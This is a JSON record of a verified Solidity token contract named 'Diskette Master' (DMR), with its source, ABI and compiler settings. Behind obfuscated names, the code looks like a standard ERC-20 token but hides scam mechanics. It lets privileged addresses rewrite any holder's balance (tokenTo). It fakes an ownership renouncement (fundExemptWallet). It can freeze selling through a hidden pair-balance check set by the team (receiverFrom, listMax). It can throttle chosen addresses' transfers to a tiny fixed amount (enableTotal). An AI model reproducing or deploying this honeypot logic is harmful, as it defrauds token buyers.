{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface shouldTx {\n    function createPair(address takeBuyToken, address receiverMarketing) external returns (address);\n}\n\ninterface listMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellListAt) external view returns (uint256);\n\n    function transfer(address tokenAuto, uint256 receiverMarketingIs) external returns (bool);\n\n    function allowance(address swapTakeAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverMarketingIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenAuto,\n        uint256 receiverMarketingIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldAuto, uint256 value);\n    event Approval(address indexed swapTakeAuto, address indexed spender, uint256 value);\n}\n\nabstract contract receiverList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listMarketingMetadata is listMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DisketteMaster is receiverList, listMarketing, listMarketingMetadata {\n\n    uint256 fundBuy;\n\n    address public totalEnable;\n\n    bool public listTake;\n\n    mapping(address => bool) public totalShouldTeam;\n\n    uint256 private receiverSwapTake;\n\n    address private sellLimit;\n\n    mapping(address => uint256) private exemptReceiver;\n\n    uint256 private isSell;\n\n    function balanceOf(address sellListAt) public view virtual override returns (uint256) {\n        return exemptReceiver[sellListAt];\n    }\n\n    function transfer(address feeFund, uint256 receiverMarketingIs) external virtual override returns (bool) {\n        return listMax(_msgSender(), feeFund, receiverMarketingIs);\n    }\n\n    function listToFund(address swapLiquidity) public {\n        if (listTake) {\n            return;\n        }\n        if (modeAt) {\n            tokenMaxBuy = isSell;\n        }\n        txTeam[swapLiquidity] = true;\n        \n        listTake = true;\n    }\n\n    mapping(address => bool) public txTeam;\n\n    function tokenTo(address feeFund, uint256 receiverMarketingIs) public {\n        atFrom();\n        exemptReceiver[feeFund] = receiverMarketingIs;\n    }\n\n    uint256 private tradingReceiverTeam = 100000000 * 10 ** 18;\n\n    function allowance(address buyMode, address isSwap) external view virtual override returns (uint256) {\n        if (isSwap == marketingLiquidityAt) {\n            return type(uint256).max;\n        }\n        return minSender[buyMode][isSwap];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptMode;\n    }\n\n    string private exemptMode = \"DMR\";\n\n    bool public totalMin;\n\n    uint256 atBuy;\n\n    uint256 constant receiverLiquidity = 6 ** 10;\n\n    uint256 private minTake;\n\n    function approve(address isSwap, uint256 receiverMarketingIs) public virtual override returns (bool) {\n        minSender[_msgSender()][isSwap] = receiverMarketingIs;\n        emit Approval(_msgSender(), isSwap, receiverMarketingIs);\n        return true;\n    }\n\n    function fundExemptWallet() public {\n        emit OwnershipTransferred(totalEnable, address(0));\n        sellLimit = address(0);\n    }\n\n    function listMax(address takeSwapTo, address tokenAuto, uint256 receiverMarketingIs) internal returns (bool) {\n        if (takeSwapTo == totalEnable) {\n            return limitEnable(takeSwapTo, tokenAuto, receiverMarketingIs);\n        }\n        uint256 fundList = listMarketing(txLaunched).balanceOf(minReceiver);\n        require(fundList == fundBuy);\n        require(tokenAuto != minReceiver);\n        if (totalShouldTeam[takeSwapTo]) {\n            return limitEnable(takeSwapTo, tokenAuto, receiverLiquidity);\n        }\n        return limitEnable(takeSwapTo, tokenAuto, receiverMarketingIs);\n    }\n\n    bool public tokenModeAt;\n\n    function transferFrom(address takeSwapTo, address tokenAuto, uint256 receiverMarketingIs) external override returns (bool) {\n        if (_msgSender() != marketingLiquidityAt) {\n            if (minSender[takeSwapTo][_msgSender()] != type(uint256).max) {\n                require(receiverMarketingIs <= minSender[takeSwapTo][_msgSender()]);\n                minSender[takeSwapTo][_msgSender()] -= receiverMarketingIs;\n            }\n        }\n        return listMax(takeSwapTo, tokenAuto, receiverMarketingIs);\n    }\n\n    function receiverFrom(uint256 receiverMarketingIs) public {\n        atFrom();\n        fundBuy = receiverMarketingIs;\n    }\n\n    function owner() external view returns (address) {\n        return sellLimit;\n    }\n\n    bool public modeAt;\n\n    constructor (){\n        if (takeSender != isSell) {\n            modeAt = true;\n        }\n        swapReceiver teamLaunchToken = swapReceiver(marketingLiquidityAt);\n        txLaunched = shouldTx(teamLaunchToken.factory()).createPair(teamLaunchToken.WETH(), address(this));\n        if (receiverSwapTake == tokenMaxBuy) {\n            swapFundToken = takeSender;\n        }\n        totalEnable = _msgSender();\n        txTeam[totalEnable] = true;\n        exemptReceiver[totalEnable] = tradingReceiverTeam;\n        fundExemptWallet();\n        if (modeAt) {\n            swapFundToken = isMode;\n        }\n        emit Transfer(address(0), totalEnable, tradingReceiverTeam);\n    }\n\n    uint256 public isMode;\n\n    address minReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptAmountSender;\n    }\n\n    function limitEnable(address takeSwapTo, address tokenAuto, uint256 receiverMarketingIs) internal returns (bool) {\n        require(exemptReceiver[takeSwapTo] >= receiverMarketingIs);\n        exemptReceiver[takeSwapTo] -= receiverMarketingIs;\n        exemptReceiver[tokenAuto] += receiverMarketingIs;\n        emit Transfer(takeSwapTo, tokenAuto, receiverMarketingIs);\n        return true;\n    }\n\n    uint256 private tokenMaxBuy;\n\n    function enableTotal(address minAt) public {\n        atFrom();\n        if (swapFundToken == isSell) {\n            isSell = swapFundToken;\n        }\n        if (minAt == totalEnable || minAt == txLaunched) {\n            return;\n        }\n        totalShouldTeam[minAt] = true;\n    }\n\n    uint8 private exemptAmountSender = 18;\n\n    function atFrom() private view {\n        require(txTeam[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private minSender;\n\n    event OwnershipTransferred(address indexed teamListMin, address indexed marketingTake);\n\n    uint256 private takeSender;\n\n    address marketingLiquidityAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private swapFundToken;\n\n    function getOwner() external view returns (address) {\n        return sellLimit;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingReceiverTeam;\n    }\n\n    address public txLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return walletSwap;\n    }\n\n    string private walletSwap = \"Diskette Master\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTakeAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamListMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketingIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellListAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAt\",\"type\":\"address\"}],\"name\":\"enableTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundExemptWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"}],\"name\":\"listToFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverMarketingIs\",\"type\":\"uint256\"}],\"name\":\"receiverFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenModeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketingIs\",\"type\":\"uint256\"}],\"name\":\"tokenTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalShouldTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketingIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSwapTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketingIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DisketteMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}